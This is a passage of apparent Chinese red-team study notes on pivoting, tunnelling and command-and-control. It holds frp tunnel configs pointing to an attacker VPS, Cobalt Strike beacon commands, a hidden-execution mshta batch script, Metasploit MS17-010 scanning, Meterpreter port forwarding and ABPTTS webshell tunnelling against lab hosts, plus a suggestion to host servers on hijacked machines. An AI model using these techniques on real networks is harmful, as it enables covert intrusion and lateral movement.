  <entry>
    <title>红队攻防学习之穿透与转发</title>
    <link href="/p/2197435e.html"/>
    <url>/p/2197435e.html</url>
    
    <content type="html"><![CDATA[<h1 id="四、穿透与转发"><a href="#四、穿透与转发" class="headerlink" title="四、穿透与转发"></a>四、穿透与转发</h1><h2 id="1、Frp内网穿透实战"><a href="#1、Frp内网穿透实战" class="headerlink" title="1、Frp内网穿透实战"></a>1、Frp内网穿透实战</h2><p>可以使用参数版frp</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>实战中，当通过某种方式拿下测试虚拟机权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。</p><p>更多详细使用方法，可查看官方Github，这里不再赘述。</p><ul><li><a href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></li></ul><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a><strong>前期准备</strong></h3><p>先准备一台VPS与域名。</p><p>因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。</p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a><strong>下载地址</strong></h3><p>Frp下载地址 [跨平台，实战中根据目标机版本选择下载]</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fatedier/</span>frp/releases</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><pre><code class="hljs ini"><span class="hljs-comment">#通用配置段</span><span class="hljs-section">[common]</span><span class="hljs-comment">#frp服务端监听 [VPS]</span><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-comment">#frp服务器监听端口 [实战中可以用一些通透性较好的端口]</span><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7007</span><span class="hljs-comment">#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]</span><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">6609</span><span class="hljs-comment">#服务端Web控制面板用户名与密码 [强口令]</span><span class="hljs-attr">dashboard_user</span> = SuperMan<span class="hljs-attr">dashboard_pwd</span> = WC3pvjmh2tt8<span class="hljs-comment">#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中</span><span class="hljs-attr">log_file</span> = ./frps.log<span class="hljs-comment">#日志记录等级，有trace、debug、info、warn、error,通常情况下为info</span><span class="hljs-attr">log_level</span> = info<span class="hljs-comment">#日志保留时间</span><span class="hljs-attr">log_max_days</span> = <span class="hljs-number">3</span><span class="hljs-comment">#验证凭据，服务端和客户端的凭据必须一样才能连接</span><span class="hljs-attr">auth_token</span> = E0iQEBOdoJeh<span class="hljs-comment">#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端]</span><span class="hljs-attr">privilege_mode</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#特权模式Token [强口令，建议随机生成]</span><span class="hljs-attr">privilege_token</span> = kukezkHC8R1H<span class="hljs-comment">#特权模式允许分配的端口 [避免端口被滥用]</span><span class="hljs-attr">privilege_allow_ports</span> = <span class="hljs-number">4000</span>-<span class="hljs-number">50000</span><span class="hljs-comment">#心跳检测超时时长</span><span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">30</span><span class="hljs-comment">#每个代理可以设置的连接池上限</span><span class="hljs-attr">max_pool_count</span> = <span class="hljs-number">20</span><span class="hljs-comment">#口令认证超时时间，一般不用改</span><span class="hljs-attr">authentication_timeout</span> = <span class="hljs-number">900</span><span class="hljs-comment">#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析]</span><span class="hljs-attr">subdomain_host</span> = xxxx.<span class="hljs-literal">on</span>line</code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><pre><code class="hljs ini"><span class="hljs-comment">#通用配置段</span><span class="hljs-section">[common]</span><span class="hljs-comment">#frp服务端IP或域名 [实战中一般都会直接用域名]</span><span class="hljs-attr">server_addr</span> = frp.xxxx.<span class="hljs-literal">on</span>line<span class="hljs-comment">#frp服务器端口</span><span class="hljs-attr">server_port</span> = <span class="hljs-number">7007</span><span class="hljs-comment">#授权token，此处必须与服务端保持一致，否则无法建立连接</span><span class="hljs-attr">auth_token</span> = E0iQEBOdoJeh<span class="hljs-comment">#启用特权模式 [特权模式下服务端无需配置]</span><span class="hljs-attr">privilege_mode</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#特权模式 token,同样要与服务端完全保持一致</span><span class="hljs-attr">privilege_token</span> = kukezkHC8R1H<span class="hljs-comment">#心跳检查间隔与超时时间</span><span class="hljs-attr">heartbeat_interval</span> = <span class="hljs-number">10</span><span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">30</span><span class="hljs-comment">#启用加密 [通信内容加密传输，有效防止流量被拦截]</span><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]</span><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#连接数量</span><span class="hljs-attr">pool_count</span> = <span class="hljs-number">20</span><span class="hljs-comment">#内网穿透通常用socks5</span><span class="hljs-section">[socks5]</span><span class="hljs-attr">type</span> = tcp<span class="hljs-comment">#连接VPS内网穿透的远程连接端口</span><span class="hljs-attr">remote_port</span> = <span class="hljs-number">9066</span><span class="hljs-comment">#使用插件socks5代理</span><span class="hljs-attr">plugin</span> = socks5<span class="hljs-comment">#socks5连接口令 [根据实际情况进行配置]</span><span class="hljs-comment">#plugin_user = SuperMan</span><span class="hljs-comment">#plugin_passwd = ZBO0McQe6mE1</span></code></pre><h3 id="执行部署"><a href="#执行部署" class="headerlink" title="执行部署"></a><strong>执行部署</strong></h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><p>SSH连接到VPS上，后台启动frp服务端。</p><pre><code class="hljs bash">root@Ubuntu:~<span class="hljs-comment"># cd tools/frp/</span>root@Ubuntu:~/tools/frp<span class="hljs-comment"># nohup ./frps -c frps.ini &amp;</span>root@Ubuntu:~/tools/frp<span class="hljs-comment"># jobs -l</span>root@Ubuntu:~/tools/frp<span class="hljs-comment"># cat frps.log</span></code></pre><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><p>将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。</p><p>当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到</p><p>但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序</p><pre><code class="hljs smali">beacon&gt; sleep 10beacon&gt;<span class="hljs-built_in"> execute </span>c:/frpc.exe -c c:/frpc.inibeacon&gt; shell netstat -ano |findstr 7007</code></pre><p>或者，创建后台运行的bat脚本。</p><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">1</span>&quot; == &quot;h&quot; <span class="hljs-keyword">goto</span> beginmshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,<span class="hljs-number">0</span>)(window.close)&amp;&amp;<span class="hljs-keyword">exit</span>:begin<span class="hljs-function">c:\<span class="hljs-title">frpc.exe</span> -<span class="hljs-title">c</span> <span class="hljs-title">c</span>:\<span class="hljs-title">frpc.ini</span></span></code></pre><h3 id="工具穿透"><a href="#工具穿透" class="headerlink" title="工具穿透"></a><strong>工具穿透</strong></h3><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h4><p>当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。[若socks5设置口令，可结合proxychains]</p><pre><code class="hljs apache"><span class="hljs-attribute">msf5</span> &gt; setg proxies socks<span class="hljs-number">5</span>:frp.xxxx.online:<span class="hljs-number">9066</span><span class="hljs-attribute">msf5</span> &gt; use auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span><span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; set threads <span class="hljs-number">10</span><span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; set rhosts <span class="hljs-number">192.168.144.178</span><span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; run</code></pre><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h4><p>Windows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h3><p>Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“做菜的肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://mp.weixin.qq.com/s?__biz=MzU<span class="hljs-number">1</span>NjgzOTAyMg==&amp;mid=<span class="hljs-number">2247485563</span>&amp;idx=<span class="hljs-number">2</span>&amp;sn=<span class="hljs-number">1163136</span>fa<span class="hljs-number">1</span>e<span class="hljs-number">407</span>bef<span class="hljs-number">053</span>a<span class="hljs-number">7</span>ce<span class="hljs-number">8</span>c<span class="hljs-number">6</span>f<span class="hljs-number">1</span>fb<span class="hljs-number">4</span>&amp;chksm=fc<span class="hljs-number">3</span>fb<span class="hljs-number">17</span>acb<span class="hljs-number">48386</span>c<span class="hljs-number">0</span>d<span class="hljs-number">41802</span>ee<span class="hljs-number">5</span>f<span class="hljs-number">2</span>e<span class="hljs-number">1469</span>d<span class="hljs-number">192422</span>d<span class="hljs-number">80</span>c<span class="hljs-number">1</span>b<span class="hljs-number">03</span>ed<span class="hljs-number">476</span>beec<span class="hljs-number">419</span>c<span class="hljs-number">43</span>e<span class="hljs-number">06</span>e<span class="hljs-number">341621</span>a<span class="hljs-number">26</span>&amp;scene=<span class="hljs-number">21</span>    ---AnonySec 感谢大佬</code></pre><hr><h2 id="2、基于ported端口转发"><a href="#2、基于ported端口转发" class="headerlink" title="2、基于ported端口转发"></a>2、基于ported端口转发</h2><p>portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4–IPV6的转换转发。并且内置于meterpreter。其中exe单版本源码如下：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rssnsj/</span>portfwd</code></pre><p><strong>攻击机：</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.5</span> Debian</code></pre><p><strong>靶机：</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.4</span> Windows <span class="hljs-number">7</span><span class="hljs-number">192.168.1.119</span> Windows <span class="hljs-number">2003</span></code></pre><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) \&gt; sessions ‐l Active sessions===============<span class="hljs-keyword">Id</span> <span class="hljs-keyword">Name</span> <span class="hljs-keyword">Type</span> Information <span class="hljs-keyword">Connection</span>‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐<span class="hljs-number">1</span> meterpreter x86/windows WIN03X64\Administrator @ WIN03X64 <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span>:<span class="hljs-number">45303</span> ‐&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>:<span class="hljs-number">53</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>)msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; sessions ‐i <span class="hljs-number">1</span> ‐c <span class="hljs-string">&#x27;ipconfig&#x27;</span>[*] Running <span class="hljs-string">&#x27;ipconfig&#x27;</span> <span class="hljs-keyword">on</span> meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">1</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>) Windows IP Configuration Ethernet adapter 本地连接:<span class="hljs-keyword">Connection</span>‐specific DNS Suffix . :IP Address. . . . . . . . . . . . : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>Subnet <span class="hljs-keyword">Mask</span> . . . . . . . . . . . : <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><span class="hljs-keyword">Default</span> Gateway . . . . . . . . . : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">22</span><span class="hljs-number">123456789101112131415161718192021</span></code></pre><p><strong>靶机IP为：</strong><br>192.168.1.119—windows 2003—x64</p><p>需要转发端口为：80，3389</p><pre><code class="hljs dns">msf exploit(multi/handler) &gt; sessions ‐i <span class="hljs-number">1</span>[*] Starting interaction with <span class="hljs-number">1</span>... meterpreter &gt; shellProcess <span class="hljs-number">4012</span> created.Channel <span class="hljs-number">56</span> created.Microsoft Windows [版本 <span class="hljs-number">5.2.3790</span>](C) 版权所有 <span class="hljs-number">1985‐2003</span> Microsoft Corp.C:\Documents and Settings\Administrator\桌面&gt;if defined PSModulePath (echo ok!) else (echo sorry!)if defined PSModulePath (echo ok!) else (echo sorry!)sorry! C:\Documents and Settings\Administrator\桌面&gt;net config Workstationnet config Workstation计算机名 \\WIN03X64计算机全名 win03x64用户名 Administrator工作站正运行于NetbiosSmb (<span class="hljs-number">000000000000</span>)NetBT_Tcpip_&#123;<span class="hljs-number">37C12280</span>‐A19D‐<span class="hljs-number">4</span>D1A‐<span class="hljs-number">9365</span>‐<span class="hljs-number">6</span>CBF2CAE5B07&#125; (<span class="hljs-number">000</span>C2985D67D) 软件版本 Microsoft Windows Server <span class="hljs-number">2003</span>工作站域 WORKGROUP登录域 WIN03X64COM 打开超时 (秒) <span class="hljs-number">0</span>COM 发送计数 (字节) <span class="hljs-number">16</span>COM 发送超时 (毫秒) <span class="hljs-number">250</span>命令成功完成。C:\Documents and Settings\Administrator\桌面&gt;netstat ‐an|findstr &quot;LIST ENING&quot;netstat ‐an|findstr &quot;LISTENING&quot;TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">80 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">135 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">445 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1025 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1026 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">3078 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">3389 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9001 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">2995 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9000 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9999 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENINGTCP <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">139 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING</code></pre><pre><code class="hljs pf">meterpreter &gt; portfwd ‐hUsage: portfwd [‐h] [add | delete | list | <span class="hljs-keyword">flush</span>] [args] OPTIONS:‐L <span class="hljs-variable">&lt;opt&gt;</span> Forward: local host <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span> (optional). Reverse: local host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.‐R Indicates a reverse <span class="hljs-keyword">port</span> forward.‐h Help banner.‐i <span class="hljs-variable">&lt;opt&gt;</span> Index of the <span class="hljs-keyword">port</span> forward entry <span class="hljs-keyword">to</span> interact with (see the <span class="hljs-string">&quot;list&quot;</span> command).‐l <span class="hljs-variable">&lt;opt&gt;</span> Forward: local <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>. Reverse: local <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.‐p <span class="hljs-variable">&lt;opt&gt;</span> Forward: remote <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>. Reverse: remote <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>.‐r <span class="hljs-variable">&lt;opt&gt;</span> Forward: remote host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.<span class="hljs-number">1234567891011</span></code></pre><p><strong>攻击机执行：</strong></p><pre><code class="hljs dns">meterpreter &gt; portfwd add ‐l <span class="hljs-number">33389</span> ‐r <span class="hljs-number">192.168.1.119</span> ‐p <span class="hljs-number">3389</span>[*] Local TCP relay created: :<span class="hljs-number">33389</span> &lt;‐&gt; <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">3389</span>meterpreter &gt; portfwd add ‐l <span class="hljs-number">30080</span> ‐r <span class="hljs-number">192.168.1.119</span> ‐p <span class="hljs-number">80</span>[*] Local TCP relay created: :<span class="hljs-number">30080</span> &lt;‐&gt; <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">80</span>meterpreter &gt; portfwd Active Port Forwards==================== Index Local Remote Direction‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐<span class="hljs-number">1 0.0.0</span>.<span class="hljs-number">0:33389 192</span>.<span class="hljs-number">168.1.119</span>:<span class="hljs-number">3389</span> Forward<span class="hljs-number">2 0.0.0</span>.<span class="hljs-number">0:30080 192</span>.<span class="hljs-number">168.1.119:80</span> Forward <span class="hljs-number">2</span> total active port forwards.</code></pre><p>查看攻击机LISTEN端口：转发已成功</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@John:~# netstat ‐ntlp |grep :<span class="hljs-number">3</span><span class="hljs-attribute">tcp</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:33389</span> <span class="hljs-number">0.0.0.0</span>:* LISTEN <span class="hljs-number">2319</span>/ruby<span class="hljs-attribute">tcp</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:30080</span> <span class="hljs-number">0.0.0.0</span>:* LISTEN <span class="hljs-number">2319</span>/ruby <span class="hljs-number">4</span></code></pre><p>Windows 7 分别访问攻击机33389，30080，既等价访问靶机3389，80</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">91</span>-<span class="hljs-number">100</span>/<span class="hljs-number">95</span>-ji-yu-portfwd-duan-kou-zhuan-fa</code></pre><hr><h2 id="3、Venom-代理转发、多级穿透"><a href="#3、Venom-代理转发、多级穿透" class="headerlink" title="3、Venom-代理转发、多级穿透"></a>3、Venom-代理转发、多级穿透</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ms509.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">06</span><span class="hljs-regexp">/17/</span>Intranet-penetration/   --非常详细全面的内网穿透技术总结https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u011215939/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">103403545</span>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4058</span>   --Venom 渗透测试人员的多级代理http:<span class="hljs-regexp">//</span>www.vkxss.top<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/30/</span>内网渗透-Venom内网工具使用实战/</code></pre><hr><h2 id="4、DNS隧道"><a href="#4、DNS隧道" class="headerlink" title="4、DNS隧道"></a>4、DNS隧道</h2><h3 id="dns隧道之dns2tcp"><a href="#dns隧道之dns2tcp" class="headerlink" title="dns隧道之dns2tcp"></a>dns隧道之dns2tcp</h3><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.dengxj.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">14</span>/https:<span class="hljs-regexp">//m</span>ntn0x.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">03</span><span class="hljs-regexp">/24/</span>DNS隧道搭建/https:<span class="hljs-regexp">//</span>blog.werner.wiki<span class="hljs-regexp">/building-a-dns-tunnel-with-dns2tcp/</span>   --使用dns2tcp搭建DNS隧道(老文章思路）</code></pre><p>书里的思路也很好…</p><hr><h3 id="dns隧道之dnscat2"><a href="#dns隧道之dnscat2" class="headerlink" title="dns隧道之dnscat2"></a>dns隧道之dnscat2</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/</span>PY0A   --DNScat2工具:通过DNS进行C&amp;C通信https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_41598660/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106658548</span>   --最新复现文章</code></pre><h3 id="dns隧道之Iodine"><a href="#dns隧道之Iodine" class="headerlink" title="dns隧道之Iodine"></a>dns隧道之Iodine</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">70263701</span>https:<span class="hljs-regexp">//</span>juejin.im<span class="hljs-regexp">/post/</span><span class="hljs-number">6844903767461068807</span></code></pre><p>书上介绍了MSF配合lodine使用方法…</p><h3 id="使用dns协议上线msf之dnscat2"><a href="#使用dns协议上线msf之dnscat2" class="headerlink" title="使用dns协议上线msf之dnscat2"></a>使用dns协议上线msf之dnscat2</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1672113</span></code></pre><p>书上介绍了MSF配合dnscat2使用方法…</p><h3 id="使用dns协议上线msf之dns2tcp"><a href="#使用dns协议上线msf之dns2tcp" class="headerlink" title="使用dns协议上线msf之dns2tcp"></a>使用dns协议上线msf之dns2tcp</h3><p>这里只能看书了，这里树上很精彩，后期我会复现…</p><p>总结：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7701</span>      --第四章总结工具文章http:<span class="hljs-regexp">//</span>www.feidao.site<span class="hljs-regexp">/wordpress/i</span>ndex.php<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/11/yi</span>ngyong/<span class="hljs-comment">#toc-head-13  --好好看完</span>https:<span class="hljs-regexp">//</span><span class="hljs-number">2017</span>.zeronights.org<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/materials/</span>ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf</code></pre>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之命令与控制</title>
    <link href="/p/b25a2f1c.html"/>
    <url>/p/b25a2f1c.html</url>
    
    <content type="html"><![CDATA[<h1 id="三、命令与控制"><a href="#三、命令与控制" class="headerlink" title="三、命令与控制"></a>三、命令与控制</h1><h2 id="1、HTTP-隧道-ABPTTS"><a href="#1、HTTP-隧道-ABPTTS" class="headerlink" title="1、HTTP 隧道 ABPTTS"></a>1、HTTP 隧道 ABPTTS</h2><p><strong>ABPTTS简介：</strong></p><p>ABPTTS是NCC Group在2016年blackhat推出的一款将TCP流量通过HTTP/HTTPS进行流量转发，在目前云主机的大环境中，发挥了比较重要的作用，可以通过脚本进行RDP,SSH,Meterpreter的交互与连接。也意味着这样可以建立一个通过80端口得流量出站来逃避防火墙。与其它http隧道不同的是，abptts是全加密。</p><p><strong>2016年blackhat介绍：</strong></p><ul><li><a href="https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun">https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun</a></li></ul><p><strong>Github：</strong></p><ul><li><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></li></ul><p><strong>安装与生成payload：</strong></p><pre><code class="hljs bash">root@John:~<span class="hljs-comment"># git clone https://github.com/nccgroup/ABPTTS.git</span>Cloning into <span class="hljs-string">&#x27;ABPTTS&#x27;</span>...remote: Enumerating objects: 50, <span class="hljs-keyword">done</span>.remote: Total 50 (delta 0), reused 0 (delta 0), pack‐reused 50Unpacking objects: 100% (50/50), <span class="hljs-keyword">done</span>.root@John:~<span class="hljs-comment"># pip install pycrypto</span>Requirement already satisfied: pycrypto <span class="hljs-keyword">in</span> /usr/lib/python2.7/dist‐packages (2.6.1)root@John:~<span class="hljs-comment"># cd ABPTTS/</span>root@John:~/ABPTTS<span class="hljs-comment"># ls</span>abpttsclient.py abpttsfactory.py ABPTTS‐Manual.pdf data libabptts.py license.txt README.md settings_overlays templateroot@John:~/ABPTTS<span class="hljs-comment"># python abpttsfactory.py ‐o webshell</span>[2019‐01‐28 08:24:28.131919] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐[2019‐01‐28 08:24:28.131954] ‐‐==[[ ‐ Factory ‐ ]]==‐‐[2019‐01‐28 08:24:28.131965] Ben Lincoln, NCC Group[2019‐01‐28 08:24:28.131979] Version 1.0 ‐ 2016‐07‐30[2019‐01‐28 08:24:28.132706] Output files will be created <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/root/ABPTTS/webshell&quot;</span>[2019‐01‐28 08:24:28.132722] Client‐side configuration file will be written as <span class="hljs-string">&quot;/root/ABPTTS/webshell/config.txt&quot;</span>[2019‐01‐28 08:24:28.132739] Using <span class="hljs-string">&quot;/root/ABPTTS/data/american‐english ‐lowercase‐4‐64.txt&quot;</span> as a wordlist file[2019‐01‐28 08:24:28.136713] Created client configuration file <span class="hljs-string">&quot;/root/ABPTTS/webshell/config.txt&quot;</span>[2019‐01‐28 08:24:28.137760] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/abptts.jsp&quot;</span>[2019‐01‐28 08:24:28.138342] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/abptts.aspx&quot;</span>[2019‐01‐28 08:24:28.138492] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/war/WEB‐INF/web.xml&quot;</span>[2019‐01‐28 08:24:28.138555] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/war/META‐INF/MANIFEST.MF&quot;</span>[2019‐01‐28 08:24:28.139128] Prebuilt JSP WAR file: /root/ABPTTS/webshell/scabGroup.war[2019‐01‐28 08:24:28.139140] Unpacked WAR file contents:/root/ABPTTS/webshell/war</code></pre><p>安装<code>pycrypto</code>出现问题参考：</p><ul><li><a href="https://blog.csdn.net/l1028386804/article/details/87006754">https://blog.csdn.net/l1028386804/article/details/87006754</a></li></ul><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/01.png" alt="demo"><br><strong>攻击机执行：</strong></p><p>注：如果攻击机为vps，则 -f 需要填写vps_ip:port/目标机:port</p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">abpttsclient</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-selector-tag">webshell</span>/<span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">-u</span> &quot;<span class="hljs-selector-tag">http</span>://192.168.126.170<span class="hljs-selector-pseudo">:8031</span>/<span class="hljs-selector-tag">abptts</span><span class="hljs-selector-class">.aspx</span>&quot; <span 